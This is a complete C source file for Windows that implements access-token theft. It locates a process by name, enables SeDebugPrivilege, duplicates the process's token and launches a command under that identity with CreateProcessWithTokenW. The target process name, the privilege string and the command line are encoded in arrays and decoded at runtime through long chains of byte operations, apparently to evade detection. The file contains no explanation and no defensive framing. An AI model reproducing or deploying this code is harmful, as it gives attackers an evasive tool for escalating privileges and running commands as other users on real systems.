#include <windows.h>
#include <tlhelp32.h>

BOOL SetPrivilege(
	HANDLE hToken,
	unsigned char* lpszPrivilege,
	BOOL bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValue(
		NULL,
		(LPCWSTR)lpszPrivilege,
		&luid))
	{
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		return FALSE;
	}
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		return FALSE;
	}
	return TRUE;
}

DWORD GetProcessIdByName(const wchar_t* processName)
{
	DWORD processId = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
		if (Process32First(hSnapshot, &processEntry))
		{
			do
			{
				if (_wcsicmp(processEntry.szExeFile, processName) == 0)
				{
					processId = processEntry.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnapshot, &processEntry));
		}
		CloseHandle(hSnapshot);
	}
	return processId;
}

int main()
{
	unsigned char kruCe[] =
	{

		0x55, 0x5, 0x7a, 0x57, 0x99, 0x24, 0x71, 0x1b,
		0xa2, 0xf6, 0xe3, 0x85, 0x0
	};
	wchar_t procname[64];
	for (unsigned int pyk = 0; pyk < sizeof(kruCe); ++pyk)
	{
		unsigned char uQJDU = kruCe[pyk];
		uQJDU -= pyk;
		uQJDU = -uQJDU;
		uQJDU ^= 0x9f;
		uQJDU -= 0x97;
		uQJDU = ~uQJDU;
		uQJDU -= pyk;
		uQJDU ^= 0x44;
		uQJDU = -uQJDU;
		uQJDU += pyk;
		uQJDU ^= 0xaf;
		uQJDU = -uQJDU;
		uQJDU += pyk;
		uQJDU = (uQJDU >> 0x1) | (uQJDU << 0x7);
		uQJDU -= pyk;
		uQJDU ^= pyk;
		uQJDU = ~uQJDU;
		uQJDU -= 0xe6;
		uQJDU = (uQJDU >> 0x2) | (uQJDU << 0x6);
		uQJDU -= 0x57;
		uQJDU ^= pyk;
		uQJDU = -uQJDU;
		uQJDU += 0x6;
		uQJDU = (uQJDU >> 0x7) | (uQJDU << 0x1);
		uQJDU += pyk;
		uQJDU = -uQJDU;
		uQJDU ^= pyk;
		uQJDU += pyk;
		uQJDU ^= 0x9;
		uQJDU += pyk;
		uQJDU = -uQJDU;
		uQJDU -= pyk;
		uQJDU = ~uQJDU;
		uQJDU += pyk;
		uQJDU = (uQJDU >> 0x6) | (uQJDU << 0x2);
		uQJDU = ~uQJDU;
		uQJDU ^= pyk;
		uQJDU += 0xfa;
		uQJDU = (uQJDU >> 0x6) | (uQJDU << 0x2);
		uQJDU ^= pyk;
		uQJDU -= 0xdb;
		uQJDU = (uQJDU >> 0x3) | (uQJDU << 0x5);
		uQJDU -= pyk;
		uQJDU = (uQJDU >> 0x1) | (uQJDU << 0x7);
		uQJDU -= 0x41;
		uQJDU ^= pyk;
		uQJDU += 0x7;
		uQJDU = (uQJDU >> 0x3) | (uQJDU << 0x5);
		uQJDU += 0xaa;
		uQJDU ^= pyk;
		uQJDU += pyk;
		uQJDU = -uQJDU;
		uQJDU ^= pyk;
		uQJDU = -uQJDU;
		uQJDU -= 0xa5;
		uQJDU ^= pyk;
		uQJDU += 0x82;
		uQJDU = ~uQJDU;
		uQJDU ^= 0x18;
		uQJDU -= pyk;
		uQJDU ^= pyk;
		uQJDU = (uQJDU >> 0x3) | (uQJDU << 0x5);
		uQJDU ^= 0xe4;
		uQJDU -= 0xbd;
		uQJDU = ~uQJDU;
		uQJDU -= pyk;
		uQJDU ^= 0xb6;
		uQJDU -= pyk;
		uQJDU = (uQJDU >> 0x2) | (uQJDU << 0x6);
		kruCe[pyk] = uQJDU;
	}

	for (unsigned int i = 0; i < sizeof(kruCe); ++i)
	{
		procname[i] = kruCe[i];
	}
	procname[sizeof(kruCe)] = L'\0';


	DWORD PID_TO_IMPERSONATE = GetProcessIdByName(procname);
	if (PID_TO_IMPERSONATE == 0)
	{
		return 1;
	}

	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	unsigned char RGk[] =
	{

		0xb6, 0x4a, 0xba, 0x89, 0x3b, 0xe, 0x4e, 0xac,
		0x68, 0x9b, 0xe7, 0x91, 0x5e, 0xc0, 0x4, 0xe,
		0x5f
	};
	//SeDebugPrivilege
	for (unsigned int gOR = 0; gOR < sizeof(RGk); ++gOR)
	{
		unsigned char jcpm = RGk[gOR];
		jcpm = (jcpm >> 0x7) | (jcpm << 0x1);
		jcpm += 0xcc;
		jcpm = (jcpm >> 0x1) | (jcpm << 0x7);
		jcpm ^= gOR;
		jcpm -= 0x7f;
		jcpm ^= gOR;
		jcpm -= 0x99;
		jcpm = (jcpm >> 0x7) | (jcpm << 0x1);
		jcpm = ~jcpm;
		jcpm = -jcpm;
		jcpm = (jcpm >> 0x2) | (jcpm << 0x6);
		jcpm -= gOR;
		jcpm = ~jcpm;
		jcpm ^= 0x2d;
		jcpm = (jcpm >> 0x5) | (jcpm << 0x3);
		jcpm ^= gOR;
		jcpm += 0xaf;
		jcpm = -jcpm;
		jcpm -= 0xfa;
		jcpm = -jcpm;
		jcpm -= 0x79;
		jcpm ^= gOR;
		jcpm += 0x24;
		jcpm = ~jcpm;
		jcpm += 0x2d;
		jcpm = ~jcpm;
		jcpm ^= gOR;
		jcpm = (jcpm >> 0x3) | (jcpm << 0x5);
		jcpm ^= gOR;
		jcpm += 0x12;
		jcpm = (jcpm >> 0x7) | (jcpm << 0x1);
		jcpm = ~jcpm;
		jcpm -= gOR;
		jcpm = (jcpm >> 0x1) | (jcpm << 0x7);
		jcpm = -jcpm;
		jcpm += gOR;
		jcpm = -jcpm;
		jcpm += 0xbf;
		jcpm = (jcpm >> 0x5) | (jcpm << 0x3);
		jcpm -= 0x9f;
		jcpm ^= gOR;
		jcpm += 0xe3;
		jcpm = -jcpm;
		jcpm += gOR;
		jcpm = -jcpm;
		jcpm ^= 0xa6;
		jcpm -= gOR;
		jcpm = ~jcpm;
		jcpm ^= gOR;
		jcpm = (jcpm >> 0x1) | (jcpm << 0x7);
		RGk[gOR] = jcpm;
	}

	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, PID_TO_IMPERSONATE);
	BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);

	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		RevertToSelf();
	}

	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	wchar_t commandLine[64];
	unsigned char MhUmZ[] =
	{

		0x52, 0x3b, 0x3d, 0x41, 0x3, 0x6d, 0xb6, 0xba,
		0x58, 0x5b, 0x7d, 0x5f, 0xa2, 0x58, 0x60, 0xbd,
		0xf9, 0x5, 0x9e, 0xed, 0xd2, 0x5d, 0xbd, 0x1d,
		0x24, 0x77, 0x64, 0xc3, 0x62, 0xbf, 0x43
	};

	for (unsigned int oIT = 0; oIT < sizeof(MhUmZ); ++oIT)
	{
		unsigned char ETaaB = MhUmZ[oIT];
		ETaaB = ~ETaaB;
		ETaaB += oIT;
		ETaaB = (ETaaB >> 0x6) | (ETaaB << 0x2);
		ETaaB -= oIT;
		ETaaB ^= 0xde;
		ETaaB += 0xcd;
		ETaaB ^= oIT;
		ETaaB += oIT;
		ETaaB = ~ETaaB;
		ETaaB = -ETaaB;
		ETaaB -= oIT;
		ETaaB = (ETaaB >> 0x2) | (ETaaB << 0x6);
		ETaaB = -ETaaB;
		ETaaB = (ETaaB >> 0x2) | (ETaaB << 0x6);
		ETaaB = ~ETaaB;
		ETaaB += 0x7d;
		ETaaB = ~ETaaB;
		ETaaB += oIT;
		ETaaB ^= oIT;
		ETaaB += oIT;
		ETaaB ^= oIT;
		ETaaB -= 0xc5;
		ETaaB = (ETaaB >> 0x2) | (ETaaB << 0x6);
		ETaaB = ~ETaaB;
		ETaaB += 0x4f;
		ETaaB ^= oIT;
		ETaaB = -ETaaB;
		ETaaB += 0x7;
		ETaaB ^= 0xe7;
		ETaaB = ~ETaaB;
		ETaaB += 0x8a;
		ETaaB ^= 0x6c;
		ETaaB -= oIT;
		ETaaB = -ETaaB;
		ETaaB += 0xbe;
		ETaaB = ~ETaaB;
		ETaaB -= 0x4a;
		ETaaB = (ETaaB >> 0x3) | (ETaaB << 0x5);
		ETaaB = -ETaaB;
		ETaaB -= oIT;
		ETaaB = (ETaaB >> 0x7) | (ETaaB << 0x1);
		ETaaB += 0xab;
		ETaaB ^= oIT;
		ETaaB = -ETaaB;
		ETaaB = ~ETaaB;
		ETaaB = -ETaaB;
		ETaaB = (ETaaB >> 0x5) | (ETaaB << 0x3);
		ETaaB -= oIT;
		ETaaB = -ETaaB;
		ETaaB -= 0xa4;
		ETaaB ^= oIT;
		ETaaB -= 0x86;
		ETaaB = (ETaaB >> 0x5) | (ETaaB << 0x3);
		ETaaB -= oIT;
		ETaaB = -ETaaB;
		ETaaB = (ETaaB >> 0x2) | (ETaaB << 0x6);
		ETaaB ^= oIT;
		ETaaB = -ETaaB;
		ETaaB -= 0x3;
		ETaaB ^= oIT;
		MhUmZ[oIT] = ETaaB;

	}
	for (unsigned int i = 0; i < sizeof(MhUmZ); ++i)
	{
		commandLine[i] = MhUmZ[i];
	}
	commandLine[sizeof(MhUmZ)] = L'\0';


	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, commandLine, NULL, 0, NULL, NULL, &startupInfo, &processInformation);

	return 0;
}
